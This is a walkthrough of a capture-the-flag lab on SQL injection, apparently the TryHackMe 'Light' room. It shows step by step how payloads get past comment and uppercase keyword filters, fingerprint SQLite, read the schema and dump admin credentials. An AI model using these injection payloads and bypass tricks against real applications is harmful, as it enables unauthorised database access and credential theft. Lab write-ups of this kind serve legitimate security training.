# Light

<br>

<p align="center">
  <img src="https://tryhackme-images.s3.amazonaws.com/room-icons/618b3fa52f0acc0061fb0172-1737140605838" width="200">
</p>

> *Welcome to the Light database application!*

<br>

## 🧠 Intro
Welcome to **Light**, a short and clever room focused on **SQL Injection (SQLi)** and database misconfigurations. We’ll dig into some manual SQLi and bypass filters to uncover secrets hidden in plaintext. 

*Deploy the machine and let’s shine some light on this challenge.* 💡

<br>

## 🎯 Task
To pwn this room, we need to:

- Find the **username** and **password** of the **admin** user.
- Capture the **flag**.

<br>

## 🔍 Recon
The room description hints at connecting to the machine via netcat on port `1337`.

```bash
nc MACHINE_IP 1337
```

![Light_x](src/Light_x)

We're greeted by a minimal login interface. We try logging in with:

> Username: `smokey`

The server responds with the corresponding password—but doesn’t actually log us in. Strange. Seems like we’re just querying the database and getting a response.

Time to test for SQL injection. 😈

<br>

## 🧪 Exploitation (SQLi)

We start simple with the classic:

```sql
' OR 1=1 --
```

But the server blocks us:

> *"For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)"*

Okay, so comments and certain keywords are filtered. Let’s try without the comment:

```sql
' OR 1=1
```

And now we get:

> *"Error: unrecognized token: "''' LIMIT 30""*

Looks like an issue with unmatched quotes. So we try:

```sql
' OR '1=1
```

Success! We get this as response:

> *Password:

This confirm that SQLi works. Now let’s go deeper. We need to find out what DBMS we're dealing with.

We suspect it's **SQLite** (given the name *Light*), so we try this payload:

```sql
' UNION SELECT sqlite_version() '
```

...but the server complains:

> *"Ahh there is a word in there I don't like :("*  

Looks like keywords are filtered in uppercase. What if we capitalize?

```
' Union Select sqlite_version() '
```

Boom. This works—we get:

> *Password: 3.31.1*

So we’re dealing with SQLite 3. Nice.

Now, let’s enumerate the schema via the `sqlite_master` table:

```sql
' Union Select sql From sqlite_master '
```

This returns the table schema:

> `CREATE TABLE admintable (username TEXT, password TEXT)`

Perfect. Now let’s extract the data.

To list usernames:

```sql
' Union Select group_concat(username) From admintable '
```

Result:

![Light_x](src/Light_x.png)

Then for passwords:

```sql
' Union Select group_concat(password) From admintable '
```

And we get:

![Light_x](src/Light_x.png)

Mission complete. 🎯

<br>

## 🏁 Got the Flag
On the admintable table, we find the username, the password and the flag.

```
flag{go_get_it}
```

*Straight from the shadows into the light.* 🕶️💡

<br>

## 🎯 Notes
This room shows how powerful SQL injection can be even in very restricted environments. Filter bypassing, capitalization tricks, and knowledge of DBMS behavior are all key tools when digging into databases.

*Keep it light—but thorough.* 😉

<br>

## 🏠 Room Info
- 🧩 [TryHackMe - Light](https://tryhackme.com/room/lightroom)
- 🏷️ Difficulty: Easy
- 🧠 Focus: SQLi (SQL Injection)
